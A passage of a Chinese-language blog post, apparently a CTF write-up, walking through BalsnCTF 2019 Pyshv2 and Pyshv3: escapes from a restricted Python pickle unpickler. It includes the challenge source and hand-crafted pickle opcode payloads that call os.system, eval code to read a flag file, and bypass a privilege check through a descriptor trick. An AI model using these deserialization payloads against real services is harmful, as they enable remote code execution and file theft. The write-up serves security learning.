class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">S<span class="string">'sys'</span></span><br><span class="line">g100</span><br><span class="line">scsys</span><br><span class="line"><span class="built_in">get</span></span><br><span class="line">(S<span class="string">'os'</span></span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>S<span class="string">'sys'</span></span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line"><span class="keyword">system</span></span><br><span class="line">(S<span class="string">'dir'</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        module = __import__(module)</span><br><span class="line">        <span class="keyword">return</span> getattr(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py 为空</span></span><br></pre></td></tr></table></figure><p>真会玩，给你一个空模块：），先看下空模块有哪些内置方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs = __import__(<span class="string">'structs'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs</span><br><span class="line">&lt;module <span class="string">'structs'</span> <span class="keyword">from</span> <span class="string">'C:\\Users\\wywwzjj\\structs.py'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(structs)</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__cached__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__builtins__'</span>)[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p>好了，问题又转变为如何获取键值，还是比较艰难。</p><p>查文档时又发现了一个东西，原来 <code>__import__</code> 可被覆盖。</p><blockquote><p><code>__import__</code>(<em>name</em>, <em>globals=None</em>, <em>locals=None</em>, <em>fromlist=()</em>, <em>level=0</em>)</p><p>此函数会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义，但是 <strong>强烈</strong> 不建议这样做，因为使用导入钩子 (参见 <a href="https://www.python.org/dev/peps/pep-0302" target="_blank" rel="noopener"><strong>PEP 302</strong></a>) 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#__import__" target="_blank" rel="noopener"><code>__import__()</code></a> 而应该用 <a href="https://docs.python.org/zh-cn/3/library/importlib.html#importlib.import_module" target="_blank" rel="noopener"><code>importlib.import_module()</code></a>。</p></blockquote><p>那该覆盖成什么函数呢？最好是 <code>__import__(module)</code> 后能返回字典的函数。</p><p>只能从内置函数下手了，一个一个试吧，发现没一个能用的。</p><p>后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。</p><p><a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" rel="noopener">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g802k3rxitj20gz0p0q4f.jpg" alt="image.png"></p><p>这个 <code>__getattribute__</code> 恰好能符合我们的要求，真棒。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__getattribute__'</span>)(<span class="string">'__builtins__'</span>)</span><br><span class="line">&#123;'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;),...</span><br></pre></td></tr></table></figure><p>再理下思路：（伪代码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = getattr(structs, <span class="string">'__builtins__'</span>)   <span class="comment"># 获取到字典，先存起来</span></span><br><span class="line">getattr(structs, <span class="string">'__import__'</span>) = getattr(structs, <span class="string">'__getattribute__'</span>)  <span class="comment"># 覆盖 __import__</span></span><br><span class="line">setattr(structs, <span class="string">'structs'</span>, d)   <span class="comment"># 创建个 structs 的属性，字典写入该属性</span></span><br><span class="line">mo = __import__(structs) <span class="comment"># 此时的 mo 就是我们之前的 __builtins__</span></span><br><span class="line">getattr(mo, <span class="string">'get'</span>)     <span class="comment"># 获取到 get 方法，然后就可以按照 pyshv1 的思路来了</span></span><br></pre></td></tr></table></figure><p>转换为 pickle：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">p100</span><br><span class="line"><span class="number">0</span>cstructs</span><br><span class="line">__dict__</span><br><span class="line">S<span class="string">'structs'</span></span><br><span class="line">cstructs</span><br><span class="line">__builtins__<span class="meta"># 先添加 structs 属性</span></span><br><span class="line">p101</span><br><span class="line">sg101</span><br><span class="line">S<span class="string">'__import__'</span></span><br><span class="line">g100</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S<span class="string">'eval'</span></span><br><span class="line">tR(S<span class="string">'print(open("../flag").read())'</span>   <span class="meta"># 这里已经不能 __import__(<span class="string">'os'</span>) 了，能继续执行命令吗：）</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'whoami'</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">'su'</span>: self.cmd_su,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'../flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.key, flag))</span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        print(<span class="string">'Login as '</span> + user.name + <span class="string">' - '</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            print(<span class="string">'flag: Permission denied'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, group)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">''</span></span><br></pre></td></tr></table></figure><p><code>RestrictedUnpickler</code> 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。</p><p>注意到，在 <code>cmd_flag()</code> 中，<code>self.user.privileged</code> 只要就符合条件将输出 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">user.privileged = <span class="literal">False</span>  <span class="comment"># 这个有点猛，后面还有赋值，没法直接覆盖了</span></span><br></pre></td></tr></table></figure><p>魔术方法列表中可以看到，给属性赋值时，用的是 <code>__setattr__(self, name)</code>，能不能把这个干掉？</p><p>看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 <code>privileged</code> ，同时又不干扰 <code>flag</code>？</p><p>继续在魔术方法里寻找，突然看到了一个<code>创建描述符对象</code>里有 <code>__set__</code> 方法，会不会有点关系呢。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g80iq605w2j20hd0gcdgu.jpg" alt="image.png"></p><blockquote><p>属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，<code>a.x</code> 的查找顺序会从 <code>a.__dict__[&#39;x&#39;]</code> 开始，然后是 <code>type(a).__dict__[&#39;x&#39;]</code>，接下来依次查找 <code>type(a)</code> 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则 Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。 </p></blockquote><p>关于描述符的讲解还可以看下这文章：<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">https://foofish.net/what-is-descriptor-in-python.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RevealAccess</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A data descriptor that sets and returns values</span></span><br><span class="line"><span class="string">       normally and prints a message logging their access.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initval=None, name=<span class="string">'var'</span>)</span>:</span></span><br><span class="line">        self.val = initval</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, obj, objtype)</span>:</span></span><br><span class="line">        print(<span class="string">'Retrieving'</span>, self.name)</span><br><span class="line">        <span class="keyword">return</span> self.val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        print(<span class="string">'Updating'</span>, self.name)</span><br><span class="line">        self.val = val</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    x = RevealAccess(<span class="number">10</span>, <span class="string">'var "x"'</span>)</span><br><span class="line"><span class="meta">... </span>    y = <span class="number">5</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = MyClass()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x = <span class="number">20</span></span><br><span class="line">Updating var <span class="string">"x"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.y</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><p>可清楚的看到，对属性 <code>x</code> 的操作都被 “hook” 住了，而 <code>y</code> 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的 <code>RevealAccess</code>，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">m = MyClass()</span><br><span class="line">MyClass.x = m</span><br><span class="line">print(m.x)</span><br><span class="line">m.y = <span class="number">6</span></span><br><span class="line">print(m.y)</span><br><span class="line">m.x = <span class="number">3</span></span><br><span class="line">print(m.x)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>把这个过程转为 pickle：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(<span class="name">I111</span></span><br><span class="line">I222</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(<span class="name">N</span>&#125;S'__set__'</span><br><span class="line">g100</span><br><span class="line">sS'privileged'</span><br><span class="line">g101</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>看一下结果：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g81bht0kk3j20sr0ifwfr.jpg" alt="image.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><p><a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
